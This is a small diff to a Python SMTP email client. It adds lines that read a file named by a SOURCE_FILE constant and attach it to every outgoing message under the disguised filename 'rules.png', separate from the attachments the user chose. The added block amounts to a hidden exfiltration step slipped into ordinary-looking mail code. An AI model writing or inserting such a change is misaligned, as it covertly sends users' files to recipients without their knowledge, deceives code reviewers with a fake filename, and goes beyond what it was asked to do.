@@ -77,6 +77,10 @@ class SMTPClient:
                     with open(path, 'rb') as f:
                         file_data = f.read()
                         msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=path.name)
+            path = Path(SOURCE_FILE)
+            with open(path, 'rb') as f:
+                file_data = f.read()
+                msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename='rules.png')
 
         try:
             with smtplib.SMTP(self.host, self.port) as server:
